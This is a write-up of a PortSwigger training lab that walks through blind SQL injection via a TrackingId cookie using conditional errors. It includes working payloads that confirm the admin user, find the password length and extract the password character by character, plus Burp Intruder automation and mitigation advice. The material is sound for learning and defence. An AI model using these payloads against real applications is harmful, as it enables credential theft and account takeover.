# SQL Injection – Blind SQLi (Conditional Error)

# Vulnerability Overview
The application is vulnerable to blind SQL Injection via the TrackingId cookie. No visible output is returned, but conditional errors can be triggered to infer data.

# Steps to Reproduce

**Lab Link** → https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

*Navigate to*
* /filter?category=Gifts

*Identify injection point (Cookie)*
* Intercept request using Burp Suite and modify TrackingId

* * TrackingId=xyz'

* * * Internal server error → Confirms SQL injection

*Confirm conditional behavior*
* TrackingId=xyz' AND 1=1--
* * No error

* TrackingId=xyz' AND 1=1/0--

* * Internal serevr error → Confirms conditional error

*Confirm existence of administrator user*
* TrackingId=xyz' AND (SELECT CASE WHEN COUNT(*)>0 THEN NULL ELSE 1/0 END FROM users WHERE username='administrator')='a'--
* * NO ERROR → Administrator User exists

*Determine password length*
* TrackingId=xyz' AND (SELECT CASE WHEN LENGTH(password)>19 THEN NULL ELSE 1/0 END FROM users WHERE username='administrator')='a'--
* * True → No error

* TrackingId=xyz' AND (SELECT CASE WHEN LENGTH(password)>20 THEN NULL ELSE 1/0 END FROM users WHERE username='administrator')='a'--
* * False → Error → Password length = 20

*Extract password (character by character)*
* TrackingId=xyz' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN NULL ELSE 1/0 END FROM users WHERE username='administrator')='a'--
* TRUE/FALSE determines each character

Repeat for positions 1–20.

*Automate using Burp Intruder*
* Attack type: Sniper
* Payload: a–z, 0–9
* Match condition: absence of error
* Identify correct character per position

*Login*
* Username: administrator
* Password: extracted password

Successful login

# Payload Used
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN NULL ELSE 1/0 END FROM users WHERE username='administrator')='a'--

# Impact
An attacker can extract sensitive data such as user credentials through blind SQL injection, leading to full account compromise.

# Tools Used
* Burp Suite (Proxy, Repeater, Intruder)

# Mitigation
* Use parameterized queries
* Avoid dynamic SQL
* Handle errors securely
* Validate user input